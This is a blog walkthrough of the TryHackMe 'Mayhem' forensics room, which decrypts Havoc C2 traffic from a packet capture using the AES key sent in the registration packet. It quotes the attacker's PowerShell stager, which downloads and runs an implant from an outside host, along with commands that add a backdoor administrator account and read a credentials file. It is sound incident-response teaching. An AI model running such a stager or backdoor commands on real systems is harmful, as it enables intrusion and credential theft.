---
title: "TryHackMe Mayhem: Havoc C2 PCAP forensics with AES-256-CTR decryption"
date: 2026-10-23T23:47:00+05:30
lastmod: 2026-10-23T23:47:00+05:30
author: Animesh Roy
avatar: /img/avatar.jpeg
authorlink: https://anir0y.in
featureimage: img/thm-mayhem/00-thumbnail.png

categories:
  - TryHackMe
tags:
  - tryhackme
  - thm
  - rooms
  - Havoc C2
  - PCAP analysis
  - AES-256-CTR
  - network forensics
  - DFIR
  - tshark
  - Wireshark
  - incident response

draft: false
description: "TryHackMe Mayhem walkthrough: decrypt Havoc C2 Demon agent traffic with AES-256-CTR, recover attacker commands, exfiltrated credentials, and persistence."
---

| <script src="https://tryhackme.com/badge/434937"></script>| <a class="twitter-follow-button" href="https://twitter.com/anir0y" data-size="large"> Follow @anir0y<a>|
|---|---|
|Mayhem |![Mayhem room icon](https://cdn-images.tryhackme.com/room-icons/618b3fa52f0acc0061fb0172-1721060635062)|

This medium-difficulty room is a pure DFIR challenge: no VM to exploit, just a PCAP to dissect. The evidence file contains traffic from a Havoc C2 Demon agent running on a Windows Server 2019 domain controller. The room asks six questions that require identifying the compromised user's SID, the server's IPv6 address, a flag the attacker printed, the persistence account credentials, the path to the exfiltrated file, and the flag inside that file. Answering them means reverse-engineering the Havoc protocol, extracting the AES-256 key and IV from the agent's registration packet, determining the encryption mode (CTR), and decrypting both the operator's commands and the agent's output. Every answer lives inside the encrypted traffic.

## Task 1: Uncover the Secrets

### Orientation: what the PCAP contains

The evidence zip holds a single `traffic.pcapng` (298 KB, 636 packets, 183 seconds of capture). A quick `tshark -r traffic.pcapng -q -z conv,tcp` shows six TCP streams:

- Streams 0 and 1: external traffic (DNS-over-TCP, benign)
- Stream 2: GET `/install.ps1` on port 1337 (PowerShell downloader)
- Stream 3-4: GET `/notepad.exe` on port 1337 (the Havoc Demon agent binary)
- Stream 5: ~88 POST `/` requests on port 80 (the C2 channel)

Stream 5 is the entire operator session. Everything the attacker did, and everything the agent sent back, is in those POST bodies and their HTTP responses.

### The PowerShell stager

Stream 2 delivers a short script:

```
  $aysXS8Hlhf = "http://10.0.2.37:1337/notepad.exe";
  $LA4rJgSPpx = "C:\Users\paco\Downloads\notepad.exe";
  Invoke-WebRequest -Uri $aysXS8Hlhf -OutFile $LA4rJgSPpx;
  $65lmAtnzW8 = New-Object System.Net.WebClient;
  $65lmAtnzW8.DownloadFile($aysXS8Hlhf, $LA4rJgSPpx);
  Start-Process -Filepath $LA4rJgSPpx
```

It downloads the Demon agent from the attacker's host at 10.0.2.37 and saves it as `notepad.exe` in the user `paco`'s Downloads folder. Two download methods (Invoke-WebRequest and WebClient) for redundancy, then it launches the binary.

### Identifying the implant

The binary is a 95 KB PE32+ executable. `strings` and PE resource parsing reveal its internal name: `demon.x64.exe`. This is the Havoc C2 Demon agent, a post-exploitation implant that communicates over HTTP POST requests with AES-encrypted payloads. The `.rdata` section contains the AES S-box at offset 0x16de0, confirming the agent carries its own AES implementation rather than using a system library.

{{< ad >}}

### Extracting the AES key and IV

The first POST body in stream 5 is the agent's registration packet (279 bytes). Its structure:

| Offset | Length | Field |
|--------|--------|-------|
| 0 | 4 | Payload size (big-endian) |
| 4 | 4 | Magic: `0xdeadbeef` |
| 8 | 4 | Agent ID: `0x0e9fb7d8` |
| 12 | 4 | Command: `0x00000063` (register) |
| 16 | 4 | Reserved |
| 20 | 32 | **AES-256 key** |
| 52 | 16 | **AES IV / CTR counter** |
| 68 | 211 | Encrypted registration data |

The key and IV are sent in plaintext as part of the registration handshake. This is how the Havoc server learns the session encryption parameters. From byte 20:

```
  Key: 946cf2f65ac2d2b868328a18dedcc296cc40fa28fab41a0c34dcc010984410ca
  IV:  8cd00c3e349290565aaa5a8c3aacd430
```

### Cracking the encryption mode

Havoc does not use a standard library mode. Testing AES-256-CBC, CFB-128, CFB-8, OFB, and simple XOR against the registration data produced 30-44% printable characters. The breakthrough came from AES-256-CTR with the IV treated as a big-endian integer counter, incremented by 1 per 16-byte block:

```python
  def decrypt_ctr(data, key, iv):
      cipher = AES.new(key, AES.MODE_ECB)
      ctr = int.from_bytes(iv, 'big')
      result = bytearray()
      for i in range(0, len(data), 16):
          block = data[i:i+16]
          ks = cipher.encrypt(ctr.to_bytes(16, 'big'))
          result.extend(bytes(a ^ b for a, b in zip(block, ks[:len(block)])))
          ctr += 1
      return bytes(result)
```

Decrypting the registration data with this function yields 90% printable content: hostname `WIN-9H86M71MBE9`, username `paco`, domain `clientserver.thm`, internal IP `10.0.2.38`, and the process path `C:\Users\paco\Downloads\notepad.exe`.

### Decrypting the server commands

The HTTP responses from the C2 server carry the operator's commands. Each response has a 12-byte plaintext header (a marker, a per-packet value, and the encrypted payload length in little-endian), followed by AES-256-CTR encrypted data using the same key and IV. Decrypting all 8 server responses reveals the full attack timeline:

1. `/c ipconfig`
2. `/c systeminfo`
3. `/c echo THM{HavOc_C2_DeCRypTing_is_Fun_Fun_FUN}`
4. `/c net user administrato WfD3hz3AXZ4n /add`
5. `/c net localgroup administrators administrato /add`
6. `/c dir C:\Users\paco\Desktop\`
7. `/c dir C:\Users\paco\Desktop\Files\`
8. `/c type C:\Users\paco\Desktop\Files\clients.csv`

The attacker ran reconnaissance (ipconfig, systeminfo), printed a flag, created a backdoor administrator account (`administrato` with password `WfD3hz3AXZ4n`), then browsed and exfiltrated a file from paco's desktop.

### Decrypting the agent output

The agent POST bodies containing command output have a 20-byte plaintext header: size (4), magic `0xdeadbeef` (4), agent ID (4), command ID (4), and request ID (4). The encrypted payload starts at byte 20 and uses the same AES-256-CTR decryption with the IV counter resetting to the original IV value for each packet.

Decrypting all agent POST bodies recovers:

**The `whoami /all` output** (sent automatically at check-in): reveals the user SID `S-1-5-21-679395392-3966376528-1349639417-1103` for `CLIENTSERVER\paco`, along with group memberships including `BUILTIN\Administrators`.

**The `ipconfig` output**: shows a single Ethernet adapter with IPv4 address 10.0.2.38 and link-local IPv6 address `fe80::e134:1b0c:c8d5:3020%6`.

**The `systeminfo` output**: Microsoft Windows Server 2019 Standard Evaluation, build 17763, configured as Primary Domain Controller. This is a DC, not a workstation.

**The `echo` output**: `THM{HavOc_C2_DeCRypTing_is_Fun_Fun_FUN}`.

**The `net user` and `net localgroup` outputs**: both return "The command completed successfully." The attacker created a local admin account as a persistence mechanism.

**The `dir` listings**: show a `Files` subdirectory on paco's Desktop containing `clients.csv`.

**The `type clients.csv` output**: a CSV with usernames, passwords, and email addresses for accounts on the `clientserver.thm` domain, ending with the flag `THM{I_Can_SEE_ThE_fiL3_YoU_ToOk}`.

### Answers

- **What is the SID of the user that the attacker is executing everything under?** **S-1-5-21-679395392-3966376528-1349639417-1103**
- **What is the Link-local IPv6 Address of the server?** **fe80::e134:1b0c:c8d5:3020%6**
- **The attacker printed a flag for us to see. What is that flag?** **THM{HavOc_C2_DeCRypTing_is_Fun_Fun_FUN}**
- **The attacker added a new account as a persistence mechanism. What is the username and password of that account?** **administrato:WfD3hz3AXZ4n**
- **The attacker found an important file on the server. What is the full path of that file?** **C:\Users\paco\Desktop\Files\clients.csv**
- **What is the flag found inside the file from question 5?** **THM{I_Can_SEE_ThE_fiL3_YoU_ToOk}**

## Takeaways

**The Havoc C2 Demon agent sends its AES key and IV in plaintext during registration, which means a network capture of the initial handshake gives you everything you need to decrypt the entire session.** The registration packet embeds the 32-byte AES key and 16-byte IV at fixed offsets (20 and 52) inside a POST body whose structure is identifiable by the `0xdeadbeef` magic and the register command ID `0x63`. Once you have those two values and know the mode is CTR with a big-endian integer counter, every subsequent packet in both directions decrypts with the same function. The protocol does not use TLS, does not rotate keys, and does not use per-packet nonces. This is by design: Havoc prioritizes evasion (HTTP blending, custom encryption) over cryptographic robustness, and that tradeoff means a single packet capture of the session start breaks all confidentiality for the entire session.

**The encryption mode is the hardest part of this room, and the only way to find it is to test systematically rather than guess.** AES-256-CTR with a big-endian counter increment is not a common default in Python libraries (PyCryptodome's CTR mode uses a different nonce/counter structure by default), so the correct approach is to implement the raw counter-mode XOR loop with ECB as the block cipher and test it against the registration data, where you know the plaintext must contain a Windows hostname, a username, and an IP address. Once you have 90%+ printable characters, you have the right mode. The same CTR function then works for both directions (server-to-agent responses from byte 12, agent-to-server POST bodies from byte 20), with the counter resetting to the original IV value for each packet independently.

Room solved 100%: 1 task, 6 answers.
